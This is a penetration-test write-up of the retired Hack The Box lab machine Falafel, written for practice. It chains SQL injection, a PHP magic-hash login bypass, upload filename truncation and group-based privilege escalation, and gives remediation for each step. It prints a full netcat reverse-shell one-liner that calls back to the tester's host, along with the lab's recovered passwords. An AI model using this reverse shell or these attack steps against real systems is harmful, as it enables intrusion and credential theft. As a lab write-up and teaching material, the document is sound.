# HTB Falafel — Penetration Test Report

> **Environment:** Hack The Box retired machine (authorised lab environment)  
> **Difficulty:** Hard  
> **Purpose:** CWES / penetration-testing practice and reporting  
> **Disclosure note:** This report documents testing performed only against an authorised HTB lab. Flags have been redacted/snipped.

## Executive Summary

The Falafel machine exposed a web application on TCP/80 and SSH on TCP/22. Testing identified a SQL injection in the login workflow, which allowed extraction of application user records and password hashes. Analysis of the administrator hash and the application's authentication behaviour then led to a PHP type-juggling authentication bypass.

Administrator access exposed an image-upload-by-URL feature. A filename-truncation weakness in the upload process was used to place an executable PHP file on the server, resulting in remote command execution as `www-data`.

Post-exploitation identified reusable database credentials in `connection.php`, allowing access as the local user `moshe`. Membership of the `video` group exposed the framebuffer device `/dev/fb0`, allowing recovery of credentials for the user `yossi`. The `yossi` account had access to the `disk` group, providing root-equivalent read access to the underlying filesystem through `debugfs` and allowing access to root-only data.

The compromise chain demonstrated how several individually distinct weaknesses could be chained from unauthenticated web access to root-level data exposure.

---

## Scope

| Item | Value |
|---|---|
| Target | `10.129.229.139` |
| Hostname | `falafel.htb` |
| Environment | Hack The Box retired lab |
| Testing type | Black-box / guided lab assessment |

---

## 1. Initial Enumeration

I started by enumerating exposed services with Nmap and saved the output so it could be reused later if deeper reconnaissance was required.

![[Pasted image 20261003220734.png]]

The scan identified:

- TCP/22 — OpenSSH
- TCP/80 — Apache HTTP Server

Browsing to the web service revealed the Falafel Lovers application.

![[Pasted image 20261003221018.png]]

The page referenced the `falafel.htb` domain, so I added it to `/etc/hosts`:

```bash
echo "10.129.229.139 falafel.htb" | sudo tee -a /etc/hosts > /dev/null
```

The login page appeared to be the most interesting attack surface, so I moved into web enumeration using Burp Suite and directory discovery.

![[Pasted image 20261003222757.png]]

Directory enumeration identified `cyberlaw.txt`, which contained a useful hint from the application administrator:

```text
A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
```

Retrieving the file directly:

```bash
curl http://falafel.htb/cyberlaw.txt
```

This suggested two areas worth investigating further:

1. the login/authentication workflow;
2. the authenticated image-upload functionality.

---

## 2. SQL Injection in the Login Workflow

I intercepted a login attempt in Burp Suite using test values for both parameters and saved the request for SQLMap analysis.

![[Pasted image 20261003223733.png]]

The request body was:

```text
username=test&password=test
```

SQLMap was then used against the captured request to test the login endpoint and enumerate the application's `users` table.

![[Pasted image 20261003224012.png]]

The database returned two user records:

```text
Database: falafel
Table: users
[2 entries]
+----+--------+----------------------------------+----------+
| ID | role   | password                         | username |
+----+--------+----------------------------------+----------+
| 1  | admin  | 0e462096931906507119562988736854 | admin    |
| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 | chris    |
+----+--------+----------------------------------+----------+
```

The `chris` value was identified as an MD5 hash:

```bash
hash-identifier d4ee02a22fc872e36d9e3751ba72ddc8
```

Hashcat successfully recovered the password:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
d4ee02a22fc872e36d9e3751ba72ddc8:juggling
```

I then authenticated as `chris`.

![[Pasted image 20261003225713.png]]

### Impact

The SQL injection exposed authentication data stored in the application's database. This enabled password recovery for an application user and revealed the administrator's password-hash format, which was later useful in bypassing authentication.

### Remediation

- Replace dynamic SQL construction with prepared statements / parameterised queries.
- Enforce server-side input validation.
- Store passwords using a modern password-hashing function such as Argon2id or bcrypt rather than MD5.
- Avoid exposing distinguishable login responses that can aid enumeration.

---

## 3. PHP Type Juggling / Administrator Authentication Bypass

After logging in as `chris`, the profile content referenced "juggling", which pointed toward PHP type juggling.

The administrator hash begins with `0e` followed only by digits. In vulnerable PHP code that performs loose comparisons (`==`), values in this form can be interpreted as numeric scientific notation and treated as zero. A different password producing another `0e...` numeric-looking MD5 digest can therefore compare as equal even though the strings are different.

A known magic-hash input (`240610708`) could therefore be used to authenticate as `admin` against the vulnerable comparison logic.

> **Evidence note:** The ZIP currently references `Screenshot 2026-10-03 230609.png`, but that image was not included in the archive. Add the screenshot if you want the authentication-bypass step to be visually evidenced in the GitHub version.

### Impact

The flaw allowed authentication as the administrator without knowing the administrator's real password. Administrator access exposed functionality that could subsequently be abused to obtain code execution.

### Remediation

- Use strict comparisons (`===`) for authentication-related values.
- Do not compare raw password hashes directly.
- Use `password_hash()` and `password_verify()` with a modern password-hashing algorithm.

---

## 4. Image Upload Filename Truncation Leading to Remote Code Execution

Administrator access exposed an **Upload via URL** function.

![[Pasted image 20261003230912.png]]

I first confirmed that the server fetched attacker-controlled content by listening locally and providing a URL hosted from my attack machine.

```bash
sudo nc -lnvp 8082
```

The application connected back and requested the supplied file:

```text
connect to [10.10.15.197] from (UNKNOWN) [10.129.229.139] 44526
GET /img.gif HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
```

![[Pasted image 20261003232814.png]]

Testing showed that the application truncated overly long filenames. This behaviour could be abused by supplying a filename containing a valid image extension after an executable `.php` extension. When the filename was truncated, the allowed trailing image extension was removed and the server retained an executable PHP file.

The working filename length used 232 padding characters before the `.php` portion so that truncation removed the trailing image extension.

Once the PHP file had been stored in the generated upload directory, I triggered command execution through the uploaded file:

```bash
TARGET="http://10.129.229.139"
DIR="/uploads/YOUR_NEW_FILE_DIRECTORY/"
FILE="$(python3 -c 'print("a" * 232 + ".php")')"

curl -G --data-urlencode \
"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.197 4447 >/tmp/f" \
"$TARGET$DIR$FILE"
```

This resulted in command execution as the web-service account (`www-data`).

> **Reproducibility note:** Replace `YOUR_NEW_FILE_DIRECTORY` with the actual generated directory if you still have it, or label it explicitly as redacted. Also add the exact command used to create/serve the PHP payload if available; that step is currently implied rather than evidenced.

### Impact

An authenticated administrator could convert the image-upload feature into arbitrary PHP execution, resulting in full compromise of the web application context and an operating-system shell as `www-data`.

### Remediation

- Generate server-side filenames rather than trusting supplied filenames.
- Do not rely only on filename extensions for file validation.
- Store uploaded content outside the web root or in a location where script execution is disabled.
- Validate file content using MIME/magic-byte checks.
- Enforce strict allowlists and safe filename-length handling.

---

## 5. Credential Disclosure and Credential Reuse

After obtaining code execution, I enumerated the web application files and identified `connection.php`:

```bash
dir ../..
```

```text
connection.php
login.php
upload.php
...
```

The file contained plaintext database credentials:

```bash
cat ../../connection.php
```

```php
define('DB_USERNAME', 'moshe');
define('DB_PASSWORD', 'falafelIsReallyTasty');
```

The same password was accepted by the local operating-system account `moshe`:

```bash
su moshe
```

```text
Password: falafelIsReallyTasty
moshe@falafel:~$
```

The user flag was then accessible from `moshe`'s home directory. The flag value remains redacted in this public report.

### Impact

Plaintext application credentials were recoverable after the web compromise, and password reuse allowed the compromise to move from the restricted web-service account to a local interactive user.

### Remediation

- Store secrets outside the web root using protected configuration or secret-management mechanisms.
- Use separate credentials for application/database and operating-system accounts.
- Apply least privilege to database accounts.
- Rotate credentials immediately following compromise.

---

## 6. Framebuffer Disclosure via `video` Group Membership

After obtaining access as `moshe`, group enumeration showed that the account belonged to the `video` group:

```bash
groups
```

```text
moshe adm mail news voice floppy audio video games
```

The framebuffer device was readable by members of this group:

```bash
ls -la /dev/fb0
```

```text
crw-rw---- 1 root video 29, 0 ... /dev/fb0
```

Because `moshe` had read access, the live framebuffer contents could be copied:

```bash
cat /dev/fb0 > /tmp/screenshot.raw
```

The framebuffer dimensions were obtained from:

```bash
cat /sys/class/graphics/fb0/virtual_size
```

```text
1176,885
```

The raw file was transferred to the attack system and reconstructed as an image using the corresponding dimensions and RGB565 format. The reconstructed framebuffer exposed plaintext credentials for the local user `yossi`.

```text
MoshePlzStopHackingMe!
```

### Impact

An unprivileged local user could read sensitive information displayed on another user's physical/virtual console. In this case, the disclosure exposed reusable credentials for a more privileged account.

### Remediation

- Remove unnecessary users from the `video` group.
- Restrict access to framebuffer and graphics devices to accounts that genuinely require it.
- Avoid displaying or typing sensitive credentials in environments where other users can read framebuffer memory.

---

## 7. Root-Equivalent Filesystem Access via `disk` Group

The recovered credentials allowed access as `yossi`.

At this stage, the important privilege boundary was the account's membership of the `disk` group. Membership of this group provides raw access to block devices and is effectively root-equivalent because filesystem permissions can be bypassed by reading the underlying disk directly.

Using `debugfs` against `/dev/sda1` allowed access to files that would normally be readable only by root:

```bash
debugfs /dev/sda1
```

```text
debugfs: cat /root/root.txt
9bc0c5e<SNIP>
```

This demonstrated root-level data access. The root flag is intentionally redacted.

> **Precision note:** This step proves root-equivalent filesystem access, not necessarily a root shell. If you later use `debugfs` to recover `/root/.ssh/id_rsa` and authenticate as root, document that separately as full root-shell compromise.

### Impact

A local user in the `disk` group could bypass normal Unix filesystem permissions and access root-owned data directly from the underlying block device. This represents a critical local privilege boundary failure.

### Remediation

- Do not assign untrusted or non-administrative users to the `disk` group.
- Audit privileged group memberships regularly.
- Apply least privilege and remove unnecessary access to raw block devices.

---

## Attack Chain Summary

```text
Unauthenticated Web Access
        |
        v
Login SQL Injection
        |
        v
User Hash Disclosure -> chris Password Recovery
        |
        v
PHP Type Juggling -> Administrator Authentication Bypass
        |
        v
Filename Truncation in URL Upload -> PHP Execution
        |
        v
www-data Shell
        |
        v
Plaintext DB Credentials + Password Reuse
        |
        v
moshe
        |
        v
video Group -> /dev/fb0 Disclosure
        |
        v
yossi Credentials
        |
        v
disk Group -> debugfs -> Root-Only Filesystem Access
```

---

## Lessons Learned

The most difficult part of this machine for me was the local privilege-escalation chain. The web portion was closer to the material I have been practising for CWES, while the framebuffer and raw-disk techniques were less familiar.

The main areas I want to improve from this machine are:

- Linux group-based privilege escalation;
- enumeration of device files and unusual group memberships;
- recognising when local hardware/device permissions create security boundaries;
- distinguishing credential disclosure/lateral movement from direct privilege escalation;
- documenting every transition in the attack chain instead of only the successful command.

This machine was particularly useful because it required chaining multiple weaknesses rather than relying on a single exploit.

---

## References

- IppSec — Falafel walkthrough (used after getting stuck / for learning and validation)
- Hack The Box — official retired-machine walkthrough material
- PHP type juggling / magic-hash background: https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo

